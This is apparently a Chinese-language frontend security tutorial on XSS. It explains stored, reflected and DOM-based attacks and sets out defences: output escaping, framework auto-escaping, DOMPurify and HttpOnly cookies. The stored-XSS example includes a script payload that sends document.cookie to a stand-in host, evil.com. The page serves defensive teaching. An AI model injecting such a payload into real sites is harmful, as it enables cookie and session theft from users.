# XSS（跨站脚本攻击）

> XSS 是前端安全的头号敌人——攻击者把恶意脚本注入到你的页面，在用户浏览器里执行，能偷 token、窃取数据、冒充用户操作。理解 XSS，是理解"为什么不能随便用 innerHTML"的关键。

## 是什么

XSS（Cross-Site Scripting，跨站脚本）指攻击者把**恶意脚本注入到网页**，在其他用户的浏览器里执行。因为脚本是"在受害者访问的正规站点上下文里"运行的，能绕过同源策略，访问该站点的 Cookie、localStorage、DOM。

一句话边界：**XSS 的本质是"用户输入被当代码执行"。** 防御核心是"永不信任输入，永远区分数据和代码"。

## 为什么：三种 XSS 类型

### 1. 存储型 XSS（最危险）
恶意脚本被**存到服务器**（如发帖内容、评论），其他用户访问时被取出执行。
```
攻击者发评论：<script>fetch('//evil.com?c='+document.cookie)</script>
服务器存下来。其他用户看评论 → 脚本执行 → Cookie 被偷。
```
危害大：一次注入，持续攻击所有访问者。

### 2. 反射型 XSS
恶意脚本在 **URL 参数**里，服务器把它"反射"回页面：
```
https://bank.com/search?q=<script>...</script>
服务器把 q 直接拼进 HTML 返回 → 脚本执行。
攻击者诱导用户点这个链接。
```

### 3. DOM 型 XSS
**纯前端**导致：JS 把用户输入直接塞进 DOM，不经过服务器：
```
// URL 的 hash 被直接写入页面
document.getElementById('x').innerHTML = location.hash.slice(1)
// 访问 page#<script>...</script> → 脚本执行
```

## 怎么用：防御核心——输出转义 ★

XSS 的根因是"数据被当代码解析"。防御就是确保用户输入**永远以"文本"形式呈现，不被解析为 HTML/JS**。

### 1. 框架的自动转义 ★
现代框架（React/Vue）**默认转义**插入的内容：
```
// React 的 JSX：children 自动当文本，不当 HTML
<div>{userInput}</div>   // userInput 里的 <script> 显示成文字，不执行 ✅

// 危险 API：显式绕过转义（只在确信内容可信时用）
<div dangerouslySetInnerHTML={{__html: rawHtml}} />  // ❌ 原样插入，XSS 风险
// Vue 的 v-html 同理，危险
```
**纪律**：默认转义已防住大部分 XSS；`dangerouslySetInnerHTML`/`v-html` 是 XSS 入口，用前必须确认内容已净化。

### 2. 输出转义（不用框架时）
把 `<`/`>`/`&`/`"`/`'` 转成实体（`&lt;` 等），让浏览器当文本。注意**不同上下文转义方式不同**：
| 插入位置 | 转义要求 |
|---|---|
| HTML 正文 | 转义 `<>` |
| 属性值 | 还要转义 `"'` |
| JS 字符串 | 转义引号、反斜杠、`</script>` |
| URL 参数 | encodeURIComponent |

> 关键认知：**输入净化（sanitize）和输出转义是两件事**。输入净化（如 strip `<script>`）易绕过（攻击者总有新花样）；输出转义（确保不当代码解析）更可靠。优先输出转义。

### 3. 处理富文本（确需允许 HTML 时）
评论支持富文本（加粗、链接）时，不能简单转义（会显示原始标签），要用**白名单净化**库（DOMPurify）：
```
import DOMPurify from 'dompurify'
<div dangerouslySetInnerHTML={{__html: DOMPurify.sanitize(html)}} />
// DOMPurify 按白名单保留安全的标签（b/a），剔除 script/onclick 等
```

### 4. HttpOnly Cookie 防 token 窃取
即使发生 XSS，Cookie 设了 `HttpOnly`，JS 读不到，token 不被偷。详见 [前端鉴权与令牌存储](./auth-token-storage.md)。

## 常见坑

- ❌ **用 innerHTML 拼接用户输入**：DOM 型 XSS。
  - ✅ 正例：用 textContent，或框架的默认转义。
- ❌ **滥用 dangerouslySetInnerHTML / v-html**：绕过转义，XSS 入口。
  - ✅ 正例：确需 HTML 时用 DOMPurify 净化。
- ❌ **只转义 HTML 正文，忘转义属性/JS 上下文**：属性里的 XSS（如 `value="<script>"`）照样执行。
- ❌ **以为后端校验了前端就安全**：前端展示层仍要防 DOM 型 XSS。

## 关联（双向打通）

- **依赖 ↓**：[01-1 DOM 模型（innerHTML）](../01-1-view-fundamentals/dom-model.md)、[09 浏览器原理（同源策略）](../../09-prerequisites/README.md)
- **属于 ↑**：[01-11 安全](./README.md) → [01 核心支柱](../README.md)
- **相关 →**：
  - token 存储防 XSS 窃取 → [前端鉴权与令牌存储](./auth-token-storage.md)
  - CSP 纵深防御 → [CSP](./csp.md)
  - CSRF 与 XSS 的关系 → [CSRF](./csrf.md)
